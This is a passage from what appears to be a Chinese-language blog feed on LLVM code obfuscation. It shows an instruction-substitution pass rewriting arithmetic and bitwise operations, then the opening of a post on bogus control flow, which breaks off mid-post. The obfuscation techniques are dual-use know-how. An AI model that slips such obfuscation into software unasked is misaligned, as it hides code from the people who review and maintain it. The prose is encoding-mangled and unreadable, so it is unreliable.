å–è´Ÿæ•°ï¼Œå–ç¬¬äºŒä¸ªæ“ä½œæ•°</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateNeg</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// åˆ›å»º b - (-c)</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateSub</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), op, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::addDoubleNeg</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b + c -&gt; a = -(-b + (-c))</span></span><br><span class="line">    BinaryOperator *op, *op1, *op2;</span><br><span class="line">    <span class="comment">// b å–è´Ÿ</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateNeg</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// c å–è´Ÿ</span></span><br><span class="line">    op2 = BinaryOperator::<span class="built_in">CreateNeg</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// åˆ›å»º -b + (-c)</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAdd</span>(op1, op2, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// -b + (-c) å–è´Ÿ</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateNeg</span>(op, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::addRand</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b + c -&gt; r = rand (); a = b + r; a = a + c; a = a - r</span></span><br><span class="line">    <span class="comment">// llvm::Valueæœ‰ä¸€ä¸ªllvm::Type*,getTypeæ–¹æ³•å¯ä»¥è·å–å…¶ç±»å‹</span></span><br><span class="line">    <span class="comment">// (ConstantInt*)æ˜¯å¼ºåˆ¶ç±»å‹è½¬æ¢</span></span><br><span class="line">    ConstantInt *r = (ConstantInt*)<span class="built_in">CONST</span>(BI-&gt;<span class="built_in">getType</span>(), <span class="built_in">rand</span>());</span><br><span class="line">    BinaryOperator *op, *op1, *op2;</span><br><span class="line">    <span class="comment">// b + r</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAdd</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b + r + c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAdd</span>(op, BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b + r + c - r = b + c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateSub</span>(op, r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::addRand2</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b + c -&gt; r = rand (); a = b - r; a = a + c; a = a + r</span></span><br><span class="line">    ConstantInt *r = (ConstantInt*)<span class="built_in">CONST</span>(BI-&gt;<span class="built_in">getType</span>(), <span class="built_in">rand</span>());</span><br><span class="line">    BinaryOperator *op, *op1, *op2;</span><br><span class="line">    <span class="comment">// b - r</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateSub</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b - r + c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAdd</span>(op, BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b - r + c + r</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAdd</span>(op, r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::substituteSub</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> choice = <span class="built_in">rand</span>() % NUMBER_SUB_SUBST;</span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">subNeg</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">subRand</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">subRand2</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::subNeg</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b - c -&gt; a = b + (-c)</span></span><br><span class="line">    BinaryOperator *op;</span><br><span class="line">    <span class="comment">// -c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateNeg</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b + (-c)</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAdd</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), op, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::subRand</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b - c -&gt; r = rand (); a = b + r; a = a - c; a = a - r</span></span><br><span class="line">    ConstantInt *r = (ConstantInt*)<span class="built_in">CONST</span>(BI-&gt;<span class="built_in">getType</span>(), <span class="built_in">rand</span>());</span><br><span class="line">    BinaryOperator *op, *op1, *op2;</span><br><span class="line">    <span class="comment">// b + r</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAdd</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b + r - c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateSub</span>(op, BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b + r - c - r</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateSub</span>(op, r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::subRand2</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b - c -&gt; r = rand (); a = b - r; a = a - c; a = a + r</span></span><br><span class="line">    ConstantInt *r = (ConstantInt*)<span class="built_in">CONST</span>(BI-&gt;<span class="built_in">getType</span>(), <span class="built_in">rand</span>());</span><br><span class="line">    BinaryOperator *op, *op1, *op2;</span><br><span class="line">    <span class="comment">// b - r</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateSub</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b - r - c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateSub</span>(op, BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b - r - c + r</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAdd</span>(op, r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::substituteXor</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> choice = <span class="built_in">rand</span>() % NUMBER_XOR_SUBST;</span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">xorSubstitute</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">xorSubstituteRand</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::xorSubstitute</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b ^ c -&gt; a = ~b &amp; c | b &amp; ~c</span></span><br><span class="line">    BinaryOperator *op, *op1, *op2, *op3;</span><br><span class="line">    <span class="comment">// ~b</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateNot</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~b &amp; c</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateAnd</span>(op1, BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// -c</span></span><br><span class="line">    op2 = BinaryOperator::<span class="built_in">CreateNot</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b &amp; ~c</span></span><br><span class="line">    op2 = BinaryOperator::<span class="built_in">CreateAnd</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), op2, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~b &amp; c | b &amp; ~c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateOr</span>(op1, op2, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::xorSubstituteRand</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b ^ c -&gt; r = rand (); (b ^ r) ^ (c ^ r) &lt;=&gt; (~b &amp; r | b &amp; ~r) ^ (~c &amp; r | c &amp; ~r)</span></span><br><span class="line">    ConstantInt *r = (ConstantInt*)<span class="built_in">CONST</span>(BI-&gt;<span class="built_in">getType</span>(), <span class="built_in">rand</span>());</span><br><span class="line">    BinaryOperator *op, *op1, *op2, *op3;</span><br><span class="line">    <span class="comment">// ~b</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateNot</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~b &amp; r</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateAnd</span>(op1, r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~r</span></span><br><span class="line">    op2 = BinaryOperator::<span class="built_in">CreateNot</span>(r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b &amp; ~r</span></span><br><span class="line">    op2 = BinaryOperator::<span class="built_in">CreateAnd</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), op2, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~b &amp; r | b &amp; ~r</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateOr</span>(op1, op2, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~c</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateNot</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~c &amp; r</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateAnd</span>(op1, r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~r</span></span><br><span class="line">    op2 = BinaryOperator::<span class="built_in">CreateNot</span>(r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// c &amp; ~r</span></span><br><span class="line">    op2 = BinaryOperator::<span class="built_in">CreateAnd</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), op2, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~c &amp; r | c &amp; ~r</span></span><br><span class="line">    op3 = BinaryOperator::<span class="built_in">CreateOr</span>(op1, op2, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// (~b &amp; r | b &amp; ~r) ^ (~c &amp; r | c &amp; ~r)</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateXor</span>(op, op3, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::substituteAnd</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> choice = <span class="built_in">rand</span>() % NUMBER_AND_SUBST;</span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">andSubstitute</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">andSubstituteRand</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::andSubstitute</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b &amp; c -&gt; a = (b ^ ~c) &amp; b</span></span><br><span class="line">    BinaryOperator *op;</span><br><span class="line">    <span class="comment">// ~c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateNot</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b ^ ~c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateXor</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), op, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// (b ^ ~c) &amp; b</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAnd</span>(op, BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::andSubstituteRand</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b &amp; c -&gt; r = rand (); a = ~(~b | ~c) &amp; (r | ~r)</span></span><br><span class="line">    ConstantInt *r = (ConstantInt*)<span class="built_in">CONST</span>(BI-&gt;<span class="built_in">getType</span>(), <span class="built_in">rand</span>());</span><br><span class="line">    BinaryOperator *op, *op1;</span><br><span class="line">    <span class="comment">// ~b</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateNot</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~c</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateNot</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~b | ~c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateOr</span>(op, op1, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~(~b | ~c)</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateNot</span>(op, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~r</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateNot</span>(r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// r | ~r</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateOr</span>(r, op1, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~(~b | ~c) &amp; (r | ~r)</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAnd</span>(op, op1, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::substituteOr</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> choice = <span class="built_in">rand</span>() % NUMBER_OR_SUBST;</span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">orSubstitute</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">orSubstituteRand</span>(BI);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::orSubstitute</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b | c -&gt; a = (b &amp; c) | (b ^ c)</span></span><br><span class="line">    BinaryOperator *op, *op1;</span><br><span class="line">    <span class="comment">// b &amp; c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAnd</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// b ^ c</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateXor</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// (b &amp; c) | (b ^ c)</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateOr</span>(op, op1, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Substitution::orSubstituteRand</span><span class="params">(BinaryOperator *BI)</span></span>&#123;</span><br><span class="line">    <span class="comment">// a = b | c -&gt; r = rand (); a = ~(~b &amp; ~c) &amp; (r | ~r)</span></span><br><span class="line">    ConstantInt *r = (ConstantInt*)<span class="built_in">CONST</span>(BI-&gt;<span class="built_in">getType</span>(), <span class="built_in">rand</span>());</span><br><span class="line">    BinaryOperator *op, *op1;</span><br><span class="line">    <span class="comment">// ~b</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateNot</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~c</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateNot</span>(BI-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>), <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~b &amp; ~c</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAnd</span>(op, op1, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~(~b &amp; ~c)</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateNot</span>(op, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~r</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateNot</span>(r, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// r | ~r</span></span><br><span class="line">    op1 = BinaryOperator::<span class="built_in">CreateOr</span>(r, op1, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    <span class="comment">// ~(~b &amp; ~c) &amp; (r | ~r)</span></span><br><span class="line">    op = BinaryOperator::<span class="built_in">CreateAnd</span>(op, op1, <span class="string">&quot;&quot;</span>, BI);</span><br><span class="line">    BI-&gt;<span class="built_in">replaceAllUsesWith</span>(op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Substitution::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Substitution&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;sub&quot;</span>, <span class="string">&quot;Replace a binary instruction with equivalent instructions.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆå…­ï¼‰</title>
      <link href="/posts/43649/"/>
      <url>/posts/43649/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="è™šå‡æ§åˆ¶æµåŸç†åˆ†æ"><a href="#è™šå‡æ§åˆ¶æµåŸç†åˆ†æ" class="headerlink" title="è™šå‡æ§åˆ¶æµåŸç†åˆ†æ"></a>è™šå‡æ§åˆ¶æµåŸç†åˆ†æ</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>è™šå‡æ§åˆ¶æµæŒ‡ï¼Œé€šè¿‡å‘æ­£å¸¸æ§åˆ¶æµä¸­æ’å…¥è‹¥å¹²<strong>ä¸å¯è¾¾åŸºæœ¬å—</strong>ï¼ˆæ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œçš„åŸºæœ¬å—ï¼‰å’Œç”±<strong>ä¸é€æ˜è°“è¯</strong>ï¼ˆæŒ‡ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒçš„å€¼åœ¨æ‰§è¡Œåˆ°æŸå¤„æ—¶ï¼Œå¯¹ç¨‹åºå‘˜è€Œè¨€å¿…ç„¶æ˜¯å·²çŸ¥çš„ï¼Œä½†æ˜¯ç”±äºæŸç§åŸå› ï¼Œç¼–è¯‘å™¨æˆ–è€…è¯´é™æ€åˆ†æå™¨æ— æ³•æ¨æ–­å‡ºè¿™ä¸ªå€¼ï¼Œåªèƒ½åœ¨è¿è¡Œæ—¶ç¡®å®šï¼‰é€ æˆçš„è™šå‡è·³è½¬ï¼Œä»¥äº§ç”Ÿå¤§é‡åƒåœ¾ä»£ç å¹²æ‰°æ”»å‡»è€…åˆ†æçš„æ··æ·†ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230220031652121.png" alt="image-20230220031652121"></p><p>çœŸå®çš„æƒ…å†µæ›´åŠ å¤æ‚ã€‚è™šå‡çš„è·³è½¬å’Œå†—ä½™çš„ä¸å¯è¾¾åŸºæœ¬å—å¯¼è‡´äº†å¤§é‡åƒåœ¾ä»£ç ï¼Œä¸¥é‡å¹²æ‰°äº†æ”»å‡»è€…çš„åˆ†æï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230220031603287.png" alt="image-20230220031603287"></p><h2 id="ç»“æ„-amp-amp-æ··æ·†æ•ˆæœ"><a href="#ç»“æ„-amp-amp-æ··æ·†æ•ˆæœ" class="headerlink" title="ç»“æ„ &amp;&amp; æ··æ·†æ•ˆæœ"></a>ç»“æ„ &amp;&amp; æ··æ·†æ•ˆæœ</h2><p>ä¸æ§åˆ¶æµå¹³å¦åŒ–ä¸åŒï¼Œç»è¿‡è™šå‡æ§åˆ¶æµæ··æ·†çš„æ§åˆ¶æµå›¾å‘ˆé•¿æ¡çŠ¶ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230220031736708.png" alt="image-20230220031736708"></p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>è™šå‡æ§åˆ¶æµæ˜¯ä»¥åŸºæœ¬å—ä¸ºå•ä½è¿›è¡Œæ··æ·†çš„ï¼Œæ¯ä¸ªåŸºæœ¬å—è¦ç»è¿‡åˆ†è£‚ã€å…‹éš†ã€æ„å»ºè™šå‡è·³è½¬ç­‰æ“ä½œã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230220031908904.png" alt="image-20230220031908904"></p><h1 id="è™šå‡æ§åˆ¶æµä»£ç å®ç°æ€è·¯"><a href="#è™šå‡æ§åˆ¶æµä»£ç å®ç°æ€è·¯" class="headerlink" title="è™šå‡æ§åˆ¶æµä»£ç å®ç°æ€è·¯"></a>è™šå‡æ§åˆ¶æµä»£ç å®ç°æ€è·¯</h1><h2 id="å®ç°æ­¥éª¤"><a href="#å®ç°æ­¥éª¤" class="headerlink" title="å®ç°æ­¥éª¤"></a>å®ç°æ­¥éª¤</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šåŸºæœ¬å—æ‹†åˆ†"><a href="#ç¬¬ä¸€æ­¥ï¼šåŸºæœ¬å—æ‹†åˆ†" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šåŸºæœ¬å—æ‹†åˆ†"></a>ç¬¬ä¸€æ­¥ï¼šåŸºæœ¬å—æ‹†åˆ†</h3><p>å°†åŸºæœ¬å—æ‹†åˆ†æˆ<strong>å¤´éƒ¨ã€ä¸­éƒ¨å’Œå°¾éƒ¨</strong>ä¸‰ä¸ªåŸºæœ¬å—ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230220032135705.png" alt="image-20230220032135705"></p><p>é€šè¿‡ <code>getFirstNonPHI</code> å‡½æ•°è·å–ç¬¬ä¸€ä¸ªä¸æ˜¯ <code>PHINode</code> çš„æŒ‡ä»¤ï¼Œä»¥è¯¥æŒ‡ä»¤ä¸ºç•Œé™è¿›è¡Œåˆ†å‰²ï¼Œå¾—åˆ° <code>entryBB</code> å’Œ <code>bodyBB</code>ã€‚</p><blockquote><p>å› ä¸ºç»å¤§å¤šæ•°åŸºæœ¬å—ä¸­ PHI æŒ‡ä»¤éƒ½åœ¨æœ€å‰é¢</p></blockquote><p>ä»¥ <code>bodyBB</code> çš„ç»ˆç»“æŒ‡ä»¤ä¸ºç•Œé™è¿›è¡Œåˆ†å‰²ï¼Œæœ€ç»ˆå¾—åˆ°å¤´éƒ¨ã€ä¸­éƒ¨å’Œå°¾éƒ¨ä¸‰ä¸ªåŸºæœ¬å—ï¼Œä¹Ÿå°±æ˜¯ <code>entryBB</code>, <code>bodyBB</code> å’Œ <code>endBB</code>ï¼Œå…¶ä¸­å°¾éƒ¨åªæœ‰ç»ˆç»“æŒ‡ä»¤ã€‚</p><figure class="highlight c++"><table><tr><td 